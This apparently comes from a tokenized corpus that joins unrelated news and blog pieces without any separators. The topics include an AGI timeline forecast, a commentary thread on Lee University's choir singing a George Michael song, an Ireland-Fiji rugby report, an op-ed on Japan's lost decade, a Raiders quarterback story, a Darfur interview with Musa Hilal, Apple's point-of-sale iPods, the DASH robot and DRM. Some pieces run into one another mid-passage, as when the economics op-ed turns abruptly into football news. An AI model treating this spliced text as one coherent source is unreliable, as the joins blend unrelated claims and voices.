The system contains a long list of features that you might expect to see in a sophisticated reinforcement learner such as pseudo rewards for informative queues , inverse reward computations , uncertainty and environmental change modelling , dual model based and model free modes of operation , things to monitor context , it even seems to have mechanisms that reward the development of conceptual knowledge .
When I ask leading experts in the field whether we will understand reinforcement learning in the human brain within ten years , the answer I get back is “ yes , in fact we already have a pretty good idea how it works and our knowledge is developing rapidly . ”
The really tough nut to crack will be how the cortical system works .
There is a lot of effort going into this , but based on what I ’ve seen , it ’s hard to say just how much real progress is being made .
From the experimental neuroscience side of things we will soon have much more detailed wiring information , though this information by itself is not all that enlightening .
What would be more useful is to be able to observe the cortex in action and at the moment our ability to do this is limited .
Moreover , even if we could , we would still most likely have a major challenge ahead of us to try to come up with a useful conceptual understanding of what is going on .
Thus I suspect that for the next 5 years , and probably longer , neuroscientists working on understanding cortex are n’t going to be of much use to AGI efforts .
My guess is that sometime in the next 10 years developments in deep belief networks , temporal graphical models , liquid computation models , slow feature analysis etc. will produce sufficiently powerful hierarchical temporal generative models to essentially fill the role of cortex within an AGI .
I hope to spend most of next year looking at this so in my next yearly update I should have a clearer picture of how things are progressing in this area .
Right , so my prediction for the last 10 years has been for roughly human level AGI in the year 2025 ( though I also predict that sceptics will deny that it ’s happened when it does ! )
This year I ’ve tried to come up with something a bit more precise .
In doing so what I ’ve found is that while my mode is about 2025 , my expected value is actually a bit higher at 2028 .
This is not because I ’ve become more pessimistic during the year , rather it ’s because this time I ’ve tried to quantify my beliefs more systematically and found that the probability I assign between 2030 and 2040 drags the expectation up .
Perhaps more useful is my 90 % credibility region , which from my current belief distribution comes out at 2018 to 2036 .
If you ’d like to see this graphically , David McFadzean put together a graph of my prediction .

Is this The Sing - Off or a Soulforce Equality Ride ?
by Jeremy Hooper
Out of the six groups that are left in NBC's " The Sing - Off " competition , two of them represent historically gay - hostile universities ( Lee and Brigham Young ) .
So we could n't help but notice the annoying irony behind the selection that the group from Lee has chosen to sing tonight .
Here 's a preview :
Yes , that 's right : Freedom ' 90 , an LGBT anthem that was written and made famous by an openly gay man .
It 's a song that was motivated , at least in part , by George Michael 's then - closeted sexual orientation .
A song that is , at its core , all about breaking free from constraints .
Constraints like those that kick a senior student out of a university simply because he is gay ( accompanied by a suggestion that he could return if he went to " ex - gay " therapy ) .
If this particular university wants to be represented on national television with a song that is queer at is core , perhaps its time they reconsider their core beliefs .
After all , if we gay folk are good enough to create prize - winning tunes , then maybe , just maybe , we are also worthy of a non-confrontational education !!!!
** According to Lee University 's ' 06 - '07 handbook ( the last one they 've posted online ) , " Personal , intimate behavior between members of the same sex is forbidden . "
Not just sex -- any displayed behavior .
***
*** UPDATE : It turns out that Voices of Lee did not select the song .
The producers chose the song ( and the wardrobe , etc. ) .
So that being the case :
We no longer see any controversy here .
Or perhaps we should instead be asking why NBC would present this as the groups " guilty pleasure songs , " if the groups had absolutely nothing to do with selection !
Your thoughts
The best part ?
While the " Voices of Lee " sang the opening bars , an advertisement for Plan B , the " morning after pill " popped up on the screen .
Shame shame . :-)

These people should be booed off the stage .

From Lee University 's Community Covenant : " Scripture condemns such attitudes as greed , jealousy , pride , lust , needless anger , an unforgiving spirit , harmful discrimination and prejudice . "
Apparently being anti-LGBT does n't constitute " harmful discrimination and prejudice " in their minds .
Posted by : jtyroler | Dec 15 , 2009 12:05:41 PM
The 06-07 handbook was written 3 + years ago .
I 'd be interested to know if this policy exists in the 09 - 10 handbook ?
These have been a progressive three years for LGBT rights and acceptance , and I can only HOPE that perhaps this no longer appears in their handbook .
While I agree with the overall idea presented in this article , there is no evidence that the Voices of Lee possess discriminatory beliefs .
Consider this : A cappella , as a musical craft , has been historically the absolute opposite of gay - hostile !
In fact , many a cappella groups have provided a place of acceptance , friendship and music for straight and LGBT students alike , especially in less - accepting campus environments .
Voices of Lee are on the Sing Off representing THE MUSICAL GROUP ... not the insititution of Lee U. Besides all this , however , they are by far the weakest singers and I believe they will be next to go .
Posted by : Carrie | Dec 15 , 2009 12:30:43 PM
Carrie : A few points .
The ' 06 - '07 handbook is the latest one we can find .
It 's the latest one they have posted .
Still digging though .
But if there had been a change in policy , we would most certainly know .
Not only would groups like Soulforce celebrate it : Anti-gay outlets would surely bemoan it .
It would make news .
Plus , their online " standard of conduct " still says the following : " Scripture condemns such attitudes as greed , jealousy , pride , lust , needless anger , an unforgiving spirit , harmful discrimination , and prejudice .
Furthermore , certain behaviors are expressly prohibited by Scripture .
These include theft , lying , cheating , plagiarism , gossip , slander , profanity , vulgarity , homosexual behavior , premarital or extramarital sex , sexual promiscuity , pornography , drunkenness , gluttony , immodesty , and occult practices .
( Galatians 5 : 19 - 21 , I Corinthians 6 : 9-10 ) "
http://www.leeuniversity.edu/studentlife/standard-of-conduct.aspx
And finally :
They most certainly ARE representing Lee .
Not only in name , but in every last way .
Check out their intro video : http://www.nbc.com/sing-off/video/clips/meet-the-voices-of-lee/1183991/
I sincerely hope that the individual members are pro-acceptance , pro-equality .
But the school they are representing is decidedly not .
Posted by : G - A - Y | Dec 15 , 2009 12:37:54 PM
I am a student of Lee University .
I personally know members of the performing group , many who are uplifting individuals .
It is important to consider that the members do represent our school , but more importantly represent Christ .
Much of what you read in the posted " standard of conduct " is published at the discretion of a Board of Directors .
The University is an institution ; therefore necessarily providing what others conclude to be guidance for many students attending the University .
What I am " over " is the morose judgment cast towards these students because they are Christians .
They choose to waive the banner of Christ , not the University .
When we vote for an elected official , are you going to agree with everything that individual projects as their platform .
Probably not .
In order to participate and take an active role , you still vote for somebody .
Is this not true ?
The same is true for many of the students at Lee .
We do not agree with everything the University hurls in our direction .
We do value attending a University that IS faith based , and gives us an opportunity to surround ourselves with others of similar beliefs .
I personally to not agree with all of the Universities doctrines , but I am more than thankful for the opportunity to gain a quality education at the school .
There are also students at Lee who are Gay and I do not hear them shouting injustices .
Simply typecasting any or every Christian based upon an " outdated " pamphlet egregious and unfortunate .
Many of us our attempting to understand others , build meaningful relationships , and share whats on our hearts , please consider that we hope others will do the same .
The University is completing a 20 million dollar Science building .
Does this mean that Christians do n't believe in Science and Medicine ?
It is time to move away from blanket statements of judgment and began to talk to eachother .
My boss is openly gay .
Him and I had a long conversation this past weekend about my Faith and homosexuality .
I told him that though I might not agree with the lifestyle , I am thankful for our friendship .
That did n't seem to keep him from inviting me to his house last night to watch Voices perform .
He is n't even a Christian !
This is n't a one way street .
There are Christians who take it overboard , and give the rest of us a bad name .
This is n't the middle ages , and I am not on a Crusade .
I am living in this same world you are , breathing the same air , living during the same recession , and maybe wearing the same flannel and skinny jeans you are wearing .
Please continue to open your doors to me .
If this is about acceptance , than be able to accept others , even if we disagree .
When we bleed , we bleed the same .
Posted by : Nick | Dec 16 , 2009 9:01:13 AM
" though I might not agree with the lifestyle " Nick :
You should have led with that statement .
It 's the most telling part of your comment .
The point of this post is not that the members of the Lee group should be labeled as anti-gay -- we do not know them .
It 's also not to question the quality of education or the makeup of the student body .
Of course there are gay students -- we exist everywhere !
The point :
This university is being represented on national television by a singing group that bears its name .
They chose to sing a song that was written and performed by George Michael , a gay man .
While the lyrics are largely about his disputes with Sony , they have been interpreted to also speak to his struggles with living as closeted man ( perhaps because of record company pressure ) , and has become a sort of a coming out anthem over the years .
This is not just some song -- it is a deeply personal biography of a gay man !
The fact remains that this gay man would not be allowed as a student at Lee .
I would also assume that he would not be allowed to perform on campus , and if he was invited on , he certainly would n't be free to hold hands with his partner .
THIS IS WHAT MATTERS HERE !
LGBT people , who are deeply inwoven in the human fabric , are being barred from universities like Lee solely because of their in - born traits .
So we can't help but raise questions when these same universities get national TV representation ( and advance in the competition ) while singing a song like this .
We just can't .
Those who are gay or gay supportive are victims of these policies .
But if they do not speak out , they are also enablers .

To G - A-Y : I appreciate the point you are making .
I would like to say that there can be progressive discussion without an attempt to pigeon - hole a reflective comment by narrowly focusing on a sentence and taking it out of context .
I will say that by not honestly sharing my personal views also disables the transparency between our dialogue , which is most important .
It appears there is a discrepancy by assuming for yourself that there is a telling point to my argument from a quote and not choosing not to see my comment for what it is .
Let 's not over analyze the situation for what it is not , a time for the University to re-evaluate our core beliefs .
When you say that you cannot label the group as anti-gay because you do not know them would also negate the premise that the group did not choose the song .
The group , comprised of students from Lee University DID choose this song .
That alone , can surmise that the University , and it 's student body is nurturing an environment full of maturation .
Instead of critiquing a " conduct book " found the internet that lacks the integrity and passion of our schools culture , EMBRACE the fact that the song was chosen to be used in a competition that puts a spotlight on our University .
Is n't this most important ?
Should n't you EMBRACE the moment that a " Christian " ensemble championed a song by a Gay artist , a song that encourages revelation and an intimate understanding of who we and our neighbors are as individuals .
Is n't a step in the right direction important .
Movement is what you champion .
It is what you desire .
Right before your eyes , you witnessed it .
Please do not detract by building walls between the LGBT community and the Christian community when we are attempting to tear them down .
Do not claim that we are not appreciating the song , the artist , or the meaning .
Do not claim for yourself those who are Gay at this school when I can claim for myself that they are my classmates , room - mates , and friends .
Maybe you missed my point by just a bit .
Maybe you should have quoted the last paragraph starting with " I am living in the same world you are , " and ended with " ... the same . "
I want to thank you for giving me the opportunity to share with this board .

Nick : " I might not agree with the lifestyle " is hostile terminology .
We do not have " lifestyles " any more than heterosexual people .
I do sincerely hope that this performance is an indicator that Lee is moving in the right direction .
That would be great .
But at the same time :
Do not be disingenuous and act as if I am only referring to an " obscure statement " on the Internet !
You know as well as I do that Lee does not allow for openly gay students !
They do n't , Nick .
My husband and I would not be allowed to enroll and live as any other married heterosexual , despite our legal marriage .
The same goes for George Michael .
In fact , merely holding hands is cited as grounds for discipline .
So please , at the very least :
Be honest about university policy !
You seem to be taking this personally as a Lee student .
IMHO , that 's the wrong way to take it .
This is not about any individual or individuals -- it 's about the school itself .
Again , if you or anyone stand against anti-gay policies , then I 'd encourage you to also stand on principle and speak out against them .
On that note : I 'd love to hear from some of the Voices of Lee , and find out why they chose this song .
Posted by : G - A - Y | Dec 16 , 2009 11:43:39 AM
I actually had good friends who went to Lee , which is very close to where I grew up .
One of my friends had a gay friend , who I also met once or twice .
He lived in fear for years of being kicked out of school .
Nick : I think it 's great if they want to do big gay songs by big gay people ...
I just think that without any kind of message to go along with this , it 's bound to be taken the wrong way .
If the singers at Lee sung this song , and accompanied it with pro-gay action at their school , we would understand that that was why they had picked it .
If the singers at Lee sing this song with no further statement on the matter , we as gay people will probably assume that they either 1 ) did n't care enough to figure out that it was about a common gay experience , or 2 ) knew and did n't care or 3 ) did know that that is what the song is about but chose to use it to mean something else , all the while being part of an institution which excludes gay people .
This would be like going to a segregated Southern school in the ' 50s , and choosing to arrange " We Shall Overcome , " but never raising a voice for integration .
At the best , it 's either cowardice or ignorance .
Posted by : twilley | Dec 16 , 2009 2:24:07 PM
I should say that I was also born and raised in Tennessee .
So my knowledge of Lee is not limited to just this one matter .
Posted by : G - A - Y | Dec 16 , 2009 2:31:35 PM
G-A-Y
WOW !!!
Your insane !... Voices of Lee is the BEST GROUP ON THE SHOW !!!!
And why are you discriminating !!!
they attend Lee they didnt write the code of the school they go to !!!!
Everthing your saying is totally irrelevant !
Not liking them because the school they go to is ridiculous !
Thats like you hating all Americans because you do n't agree with some of the laws they have in America !
So yeah if thats your aim than HATE YOURSELF !!!
lol
You make me laugh !!!

So than why dont you like Voices of Lee ?!?!?!?
Posted by : AnthonyJ | Dec 16 , 2009 6:06:30 PM
Oh geez , Anthony : Read the post .
Read the comments .
I 'm not going to rehash .
This is n't about " liking " the group , its members , or its performances .
And nobody is suggesting that anything should be done to them , so stop with the childish discrimination claims .
This is a commentary site , and we have written commentary about the irony of a group from a University that bars openly gay students performing an LGBT " coming out " anthem that was written and performed by a gay man .
Nothing more , nothing less .

Ireland ( 13 ) 41
Tries : Earls 2 , O'Driscoll , Kearney , Horgan Pens : Sexton 2 Cons : Sexton 5
Fiji ( 3 ) 6
Pens : Little 2 By Richard Petrie
Ireland scored five tries as they comprehensively defeated Fiji 41 - 6 at the Royal Dublin Society .
Keith Earls crossed the line in the first period as the Irish enjoyed a 13 - 3 advantage at half - time .
Brian O'Driscoll , Earls , Rob Kearney and Shane Horgan added further touchdowns after the interval .
Jonathan Sexton kicked five conversions and two penalties on his first start for the Irish while Nicky Little landed two penalties for the Fijians .
Ireland made eight changes from the team which drew with Australia , while Fiji were missing several first - choice players for the first major international to be played at the RDS .
Sexton knocked over a ninth - minute penalty to register his first full international points in swirling wind and rain .
Five minutes later Ireland threatened to score the opening try of the game when Sexton kicked for Earls to collect the ball on the wing .
The Munster man passed to Kearney , but the full - back 's progress was halted by the Fiji defence .
The Irish did cross the Fiji line for the first time in the 18th minute as Jamie Heaslip picked up the ball from the scrum and found Eoin Reddan , who fed Earls to burst through the Fiji rearguard and under the posts to complete a well executed move , converted by Sexton .
Little shaved the post with a long - range penalty but made amends soon after by slotting the ball straight between the posts .
Man of the match Jonathan Sexton congratulates Keith Earls
In the final minute of the first half , Sexton ran out of defence and sent O'Driscoll racing clear .
The Lions centre found Gordon D'Arcy but his attempted pass to Horgan only found the hands of Norman Ligairi and a golden opportunity was wasted .
Sexton rounded off an uninspiring first half by kicking his second penalty of the game to give Ireland a 10 - point lead .
Four minutes after the break Denis Leamy received lengthy treatment before being stretchered off with a leg injury and Sean O'Brien ran onto the field for his first cap .
Little reduced Fiji 's deficit to seven points with a penalty but O'Driscoll gave his side some breathing space with a 49th - minute try , his 38th in an Ireland shirt .
The Leinster centre intercepted Little 's attempted pass and juggled the ball before running over to touch down underneath the posts .
Sexton again added the two points .
Earls scored his second try of the game after 68 minutes when he ran in at the corner to finish off a fine move involving Sexton , O'Driscoll and D'Arcy .
Sexton slotted over his third conversion and made it four out of four after Kearney slid under the tackles of two Fijian players to score Ireland 's fourth try with four minutes of normal time remaining .
Horgan dived over in the corner after good work by replacement Tomas O'Leary and D'Arcy eight minutes into added time and man -of - the - match Sexton converted from a difficult angle to maintain his 100 % kicking record .
Ireland now face world champions South Africa at Croke Park next Saturday .

When it comes to new features in an open source operating system , sometimes features are developed by community developers and other times they are contributed by commercial vendors .
The recent FreeBSD 8.0 operating system release benefited from both types of contributions .
In particular , as part of the FreeBSD 8.0 release , there is new experimental MIPS support which was contributed by networking vendor Juniper Networks ( NYSE : JNPR ) .

In the 1980s , Japan went through an enormous economic boom that was fueled mainly by explosive growth in real estate values .
With interest rates at record lows and banks increasingly willing to lend larger and larger amounts with smaller down payments and lower incomes , the heights of real estate prices seemed unlimited .
Ordinary salary men found themselves real estate millionaires .
In Tokyo , one woman spent more than $ 10 million to widen her driveway by less than a foot .
Some sushi bars offered delicacies served off the bodies of naked women and humble noodle shops added dishes sprinkled with flakes of real gold .
To accommodate the burst of wealth , there was a new diversity of investment instruments and the highly conservative ( in the " resistant to change " sense of the word )
Japanese investment community developed a new streak of creativity when it came to finding ways to stow and grow the burgeoning piles of yen .
Our own recent experience in the United States makes it obvious where Japan was headed at the start of the 1990s -- it 's just too bad that Japan 's experience did n't keep us from inflating exactly the same type of bubble in the first half of this decade .
However , if economists were all too willing to ignore the similarity of the Japanese situation in the late 1980s and the US situation in the early 2000s , there was one part of the Japanese experience that rarely left their radar .
For years , economists and Wall Street insiders have warned against the possibility that the United States might suffer the horror of the lost decade .
Throughout the 1990s , the Japanese economy , as measured by the national GDP , was stagnant .
It did n't shrink , as it would have in a classic recession , but it did n't grow .
It just sat there .
The prospect of this sustained period of " zero - growth " following on the collapse of an asset - fueled speculation bubble has been so great that warnings against the lost decade have come from both the right and the left .
Paul Krugman cautioned against the possibility of the US slipping into a similar situation .
President Obama warned against the lost decade when introducing his stimulus plan .
On the right , the Japanese example was used as a warning of what happens when government steps in to try and control the effects of an asset bubble .
But what if Japan 's lost decade is n't a peril to be avoided ?
What if it 's the target we should be aiming for ?
In 1851 , Herber Spencer , a columnist for The Economist magazine , published Social Statics .
In the book , Spencer warned that government regulation -- in fact , the simple existence of government -- was standing in the way of man 's progress .
It is clear that man can become adapted to the social state , only by being retained in the social state .
This granted , it follows that as man has been , and is still , deficient in those feelings which , by dictating just conduct , prevent the perpetual antagonism of individuals and their consequent disunion
In other words , because the government acts to make people behave , people do n't learn to behave on their own .
Spencer thought this was true both in daily life and in business affairs .
Only by removing the government can man be allowed to evolve by " perpetual antagonism " to a state where mankind becomes capable of a self - sustaining society where actions are fairly rewarded .
In shorter terms : government makes you soft .
What Spencer espoused was a pure form of Laissez - faire economics , one that countered the more moderated postulates of Adam Smith as well as the controlled markets of the " American System . "
He opposed any type of regulation , tax , or restriction on trade .
Over the next decades , Spencer would go on to write books on not just economics but psychology , biology , and sociology -- laying the groundwork for the church of pure capitalism that was later adopted by everyone from Ayn Rand to Margret Thatcher .
For most of the last century and a half , the pure conservative idea made only sporadic gains .
The reason for this was that it was so obviously flawed .
Any period of deregulation ( in America or elsewhere ) was sure to be truncated by markets run rampant with short - term greed and " creative " ways to bilk investors and customers .
Each such period required an external force to step in before the system reached collapse .
Only prompt government action saved the banks , the markets , the savings and loans , the market again , the banks again ...
Until recently , this boom - bust " business cycle " was kept in check by some measure of pragmatism .
But a funny thing happened in the 1980s .
As unrepentant conservatives took their fantasy of pure capitalism out of textbooks and into government , the swings of the cycle became ever stronger .
Thoughtful , practical action fell out of style as people increasingly internalized the idea that laissez - faire capitalism was somehow related to democracy .
Not only have we accepted radical conservative approaches as answers to disaster , as Naomi Klein covered so well in the Shock Doctrine , we 've bought into them as a daily remedy in good times or bad .
Times are good ?
Cut taxes and deregulate .
Times are bad ?
Hell , you better cut taxes and deregulate even more .
Rather than being contrite when the cycle of business excess drove the system toward the brink , the church of pure conservatism began to insist that each period of dergulation had not been deregulatory enough .
Surely more deregulation and lower taxes on the wealthy would lead to conservative heaven -- where the conservatives would be rewarded for their righteous independence and the lazy left ( filled with state - dependent minorities and corrupt labor leaders ) would spiral into a well - deserved hell .
By the later decades of his life , Spencer embraced the idea of a strong central state as a critical partner for capital growth .
That message never got to the generations that followed .
In Japan , as the government observed real estate values spiraling out of control and banks getting in over their heads , the government did n't wait for the asset bubble to pop -- it popped it .
Then it tightened the flow of money and clamped down with new regulations and restrictions .
Businesses screamed .
Real estate values tumbled , with commercial real estate falling an amazing 87 % ( which sounds enormous until you realize it was was just about what that market had gained in the last years of the bubble 's most rapid inflation ) .
The imaginary millions vanished almost overnight .
The gold flakes were no longer offered at the noodle shops .
The government imposed tough new regulations , banks were forced to fold or merge .
And the nation of Japan entered into that famous lost decade .
A decade in which the national GDP never declined below the value it held on the day the government stepped in .
A decade in which the maximum unemployment rate was 5.5 % .
A decade in which the government actually expanded its support of both business and individuals , a decade in which retirees gained new benefits , a decade in which the government did not coerce consumers to fuel the economy with reckless debt , a decade in which not one Japanese citizen lost his or her right to health care services provided by the government .
So just how lost was that decade again ?
The Japanese government acted as governments have always done in reasonable , practical countries that are dependent on capitalism .
When business gets out of control and markets are near to failure , the government steps in and picks up the burden .
The government reestablishes order and holds the economy together while business cleans the red ink from their books and gets back on their feet .
The regulatory holes that allowed markets to get out of control are patched to prevent and immediate repeat of the problem .
Then , when business is booming again , the government counts on taxes from business to put government 's books back in balance so government can be there the next time .
And there will be a next time .
It 's one of the lessons that we taught Japan after World War II , when America was a more practical , pragmatic nation .
That 's how it should be working in America today .
Government holding the ship on course while business gets over the hangover of a real lost decade -- a decade of binging and excess .
Only America is suffering from a purity problem .
Not just the last decade , but the decades since the 1980s have seen a constant slackening of government regulation and , with the notable exception of a short period under Clinton , business has forgotten that part of the deal is that it support government during good times so that government is there when times are bad .
Republicans , having converted to Spencer - style true believers in the divine intelligence of the markets , are loving capitalism to death .
Rather than turn to government to damp out the waves of the business cycle and keep the markets on an even keel , they 've fought against every attempt to reel in disastrous run-away , speculative balloons .
Instead of helping to craft regulations that patch over cracks exploited by bad actors , Republicans have argued that the cracks were not worth patching .
After all , the people driving the markets toward destruction are the smart guys while the people trying to rein them in are just government sluggards .
Is n't it clear that the smart guys will always win this race ?
Really , say conservatives , there 's no point trying to regulate since the smart guys will just find a new way to wiggle around any barrier .
It is an argument that should be dismissed out of hand , but remarkably it is n't .
And having mistaken rhetoric for reality , conservatives have turned the waves of the business cycle into tsunamis .
Government now has a hard time stepping in to help not just because Republicans have taken the position of preventing government of playing its traditional role , but also because Republicans spent us into such a pit of debt that the government is n't well positioned to shoulder the burdens of business gone sour .
We should be able to afford a stimulus plan much larger than the one already established .
We need such a plan , along with direct intervention in the job market , and swift re-regulation of the financial instruments used to take the nation to the brink .
However , the dollars that could have saved the economy were spent on building up a huge naval fleet that was never used , a fantasy defense system that has never worked , and lining the pockets of people whose pockets were already heartily lined .
Not only have conservatives - gone - wild emptied the pool as the nation was standing on the high dive , their constant drive to remove more and more regulation means that this dive is the highest ever .
Even if we'd had good fiscal policy under Reagan , Bush , and Bush jr. it would be hard to cushion against the kind of blow that was delivered thanks to the anything goes market created by Phil Graham and colleagues .
Even with the support of both parties , it would be very hard to take the level of action needed to address the problems we face .
With one of the major parties doing nothing but shouting " jump ! Jump ! " as we try to edge back from destruction , the actions of those still grounded in reality will have to be more than tough .
They 'll have to be heroic .
Having abandoned practicality for a religion of lassiez - faire or death , conservatives do n't care if they take everyone along with them on the way down .
After all , when the government is handcuffed and the middle class disappearing , it 's a sure sign that economic rapture and conservative paradise is just around the corner .
Just around the corner .
Just wait , you 'll see .
It would n't hurt us to lose a decade , especially if what 's lost is corporate profits in favor of higher employment and rising wages .
It would n't hurt us to lose a decade in which we 've swallowed poisonous ideas about the nobility of greed .
Better yet , let 's lose two decades -- the 1980s and the 2000s , along with the delusions they 've carried .
We ’ve been somewhat expecting this decision since Monday .
Charlie Frye has started just two games over the last three seasons .
Otto Greule Jr/ Getty Images
Still , it was shocking to hear the official news : The Oakland Raiders have chosen quarterback Charlie Frye to start over JaMarcus Russell .
Just when we thought Russell ’s career could n’t plummet any further , Russell ’s standing in Oakland has taken another plunge .
Folks , not only is it official that Frye will start Sunday at Denver , but it ’s official that the Raiders have given up on Russell .
The team clearly feels like it cannot compete with him .
So there goes the No. 1 overall pick in the 2007 draft .
Frye has started just two games in the past three years .
Let ’s face it :
Frye was n’t selected to start because of his ability .
He was selected because he ’s not Russell .
The Raiders do n’t want any piece of Russell .
Frye is a third - stringer and still , he is considered a better option in Oakland .
That ’s all you need to know about how the Raiders feel about Russell .
When he announced the decision to the Denver media in a conference call , coach Tom Cable declined to talk about Russell in much detail .
This has to be a sign that the team will look elsewhere in 2010 .
There is basically no salvaging Russell 's career in Oakland now .
Russell may have sealed his fate in Oakland by playing horribly in the second half of a 34 - 13 loss to Washington on Sunday after Bruce Gradkowski , who played well in four starts after replacing Russell , hurt both knees .
Russell had no spark and the rest of offense lost its momentum when he came into the game .
Russell was sacked six times in a half .
The coaching staff and Oakland owner Al Davis clearly decided that the offense does n’t respond to Russell .
Perhaps
Frye will give the team a chance to compete in the final three games if Gradkowski can’t return .
Do n’t discount the idea of J.P. Losman getting a chance to play down the stretch .
He just signed with Oakland .
At the very least , Losman will get a chance to show Oakland what he can do heading toward 2010 .
Thus , one day into his Raiders tenure , Losman seems to have a better future in Oakland than Russell .
Russell , who has disappointed the team with his lack of work ethic before , said last week he would not consider taking a pay cut to stay in Oakland .
After Wednesday ’s decision by the team , it appears it wo n’t be Russell ’s choice .
Musa Hilal has the blood of hundreds of thousands on his hands , but the Janjaweed leader claims he 's just a peacemaker .
In late February 2004 , Janjaweed militias and Sudanese government forces waged a three - day , coordinated assault on Tawila , a village in northern Darfur .
Government aircrafts destroyed buildings , while the Janjaweed broke into a girls ’ boarding school , forced the students to strip naked at gunpoint , and then gang - raped and abducted many of them .
Video footage shows fly - covered corpses strewn among the village 's smoldering ruins .
And giving orders and distributing weapons during the siege , eyewitnesses say , was Sheikh Musa Hilal .
Hilal 's name looms large on the list of perpetrators who ’ve committed atrocities in Darfur since violence erupted there in 2003 .
At Khartoum 's request , he organized the Janjaweed , predominantly Arab militias that have operated hand - in - glove with the Sudanese government to cleanse Darfur of its non-Arab population .
Hilal , who is now almost 50 years old , is among those most responsible for the deaths of more than 200,000 people and the displacement of another 2.7 million .
The U.S. government has sanctioned him , and the United Nations has issued a travel ban and asset freeze against him .
In mid-2006 , Hilal stopped giving English - language media interviews .
This past August , however , he agreed to meet with me -- three years and two months since he had last spent time with a Western journalist .
Sheikh Musa , as Hilal is known by his Mahamid clan , said that he wanted to correct the “ misperceptions ” the world has about him .
At his palatial villa in Khartoum , where paintings of Mecca and Medina adorn the walls , Hilal greeted me wearing a flowing white djellabya and a smile on his lightly freckled face .
He escorted me and my translator across his porch , past a group of men sitting cross-legged on mats -- Hilal ’s relatives , who double as his bodyguards because he only trusts his tribe for security .
As we settled into his lounge room , servants offered us chilled Coca - Cola and bottled water .
Caramels with “ Made in Poland ” wrappers sat in small crystal bowls on the coffee tables .
Hilal was hospitable , even charming , as he discussed his career with me , insisting that he is anything but the cold - hearted criminal the world thinks he is .
Since January 2008 , he has worked as an adviser to the Ministry of Federal Affairs , so he spends his days in an air - conditioned office next to President Omar Al Bashir 's Republican Palace on the edge of the Blue Nile .
It 's a far cry from the deserts of Darfur .
But Hilal told me that he did n’t accept the offer of a bureaucracy position immediately .
“ I said to [ the president ] , ‘ I am the leader of my tribe . … I am a very rich man .
I know there are some advisers who just sit here to get money , but I want to actually have a job -- solving the problem of Darfur ! ’ ” he recounted , with a grandiose sweep of his arm .
Hilal shifted his embroidered taqiyah , a skull cap , back from his forehead , revealing a receding hairline .
“ I said , ‘ If all I do is sit here -- well , I can sit with my tribe .
Also , if you think I need this position to make me famous , I do n’t .
I am already known all over the world . ’”
Introducing the Zombible project
Though the Bible is an ancient book , full of beautiful prose , timeless stories , and great truths , there has long been a barely spoken of dissatisfaction over the one element it sorely lacks : zombies .
At Zombible , we hope to remedy the situation by carefully inserting lovingly crafted zombie - oriented text into the Bible , for the enjoyment and enlightenment of all .
In our first work -- Matthew , Mark , Luke , and Zombies -- we ask the question , " How might the Gospels have been different if Jesus had come to Earth not to save mankind from sin , but from zombies ? "
( Be forwarned -- it 's sort of a " work in progress " at the moment , so there are some nasty typos and bugs that we 're still working out . )
Enjoy !

Was Zombible inspired by Pride and Prejudice and Zombies ?

Since 2005 , Apple stores have been ringing up purchases with wireless handheld point - of - sale terminals .
This always felt a little odd , partly because you never see a register , but mostly because the devices run Windows .
Not anymore !

Apple is in the process of retiring their massive fleet of Windows CE handhelds , made by Symbol Technologies and introduced back in 2005 , with custom - designed iPod Touches .
The initial announcement made this sound like a self - satisfied , gloating move by Apple , during which they 'd happily — and publicly — ditch their clunky , ugly , jury - rigged handhelds for sleek , shiny iPod Touches .
But judging by these photos nabbed by AppleInsider , this is n't quite the case .

Apple 's point - of - sale Touches take advantage of OS 3.0's hardware accessory support a lot .
Each one will be wrapped in a large plastic case , which includes a barcode scanner up top and a card reader slot in the side , as well as an extra battery .
The whole assemblage — iPod included — is powered through a mini USB port .
Naturally , sales will be carried out with a custom iPhone app ; not so naturally , credit card signatures need to be entered with a stylus , almost like you 're using Windows Mobile ( OH GOD ! ) .
Or , you know , paper .

This cockroach bot is really something to behold .
Check out the IEEE Spectrum video after the break and watch how DASH survives the fall from the top of a building and keeps running .
As robotic systems become increasingly complex , they are able to mimic real world creatures .
There are toys like the hexbugs , and more advanced robots like StickyBot that exhibit animal skills and / or behavior .
The reverse is also true , we ’ve seen robotics used to help explain developments in evolution .
This interplay between the sciences is important stuff .
When the advances in one field are applied in another the rate of new discoveries increases .
Feedback loops between biology and robots may be one of the means by which we develop the next generation of genetically engineered machines and life - like automatons .
Watching DASH in action , I ’m stunned by how simple yet powerful the robot is .
The oar - like motion of its legs is rudimentary , but it allows the bot to travel at 15 body lengths per second .
Humans would have to run at 65 mph ( ~100 km / h ) to match this feat and we have much more complicated gaits .
I ’m equally impressed by the upwards scramble at 1:56 .
Can you imagine running at a 6 foot wall and just popping over it ?
UC Berkeley ’s Biomimetics Lab , where DASH was created , is also interested in the way that robots are built .
To that end , DASH has one of the coolest constructions I ’ve seen in a robot that performs this well .
First , the materials used for the chassis are simple : cardboard and polymer .
Just one DC motor for forward motion and a smaller servomotor for turns keeps the bot weight down ( 16.2 grams is next to nothing ! ) .
Second , the build time ( less than one hour ) is ridiculous for a hand made robot .
Considering DASH ’s simple construction , I wonder if they ’d be willing to design a version that could be made on a 3D printer like MakerBot .
Finally , the design is absurdly robust .
I ’ve seen some robots that you can toss around , and robots that can jump a wall , but none that can free fall for 25 + meters onto concrete and then walk away .
As cool as DASH is , I ’m not sure that we ’ll see much more of it .
Upgrading to using a carbon fiber body would make it more resilient , but I do n’t know that we need a resilient cockroach bot .
Instead , I think that DASH is going to be an inspiration piece .
It ’s a robot whose design , construction , and performance will help engineers create the next generation of industrial and research machines .
We could see smaller versions become part of a robotic swarm , or larger versions act as hazardous environment probes .
As engineers continue to adapt animals into robots , there are all sorts of amazing possibilities .
DASH runs as fast as a roach , I wonder if there will be a bot that jumps as high as a flea , or that has the proportionate strength of an ant .
Certainly we could use a beetle robot to deal with all the… dung … going on in our world .

It 's obvious to most Linux users that Digital Rights Management ( DRM ) is a really bad idea .
It 's not just because DRM - encoded media usually wo n't play with our operating system , but rather because we understand the value of openness .
The really sad part is that DRM , at least on some level , is attempting to do a good thing .
Take Wil Wheaton for example .
You may know Wil from television or movie acting , but he 's also a successful writer .
Along with writing books , he often performs them and sells the audiobook version of his work .
Because Wil is against DRM , his books are available as unrestricted MP3 files .
That 's great for those of us who like to listen to such things on Linux or a non-iPod MP3 player .
Unfortunately , some users confuse DRM - free with copyright - free .
When otherwise decent individuals do n't think through the ramifications of redistributing someone 's copyrighted work , you end up with situations like this : tinyurl.com/stealfromwil.
If you put yourself in Mr Wheaton 's shoes for a second , you can see how tempting it is for authors — and , more important , publishing companies — to DRM - encode their work .
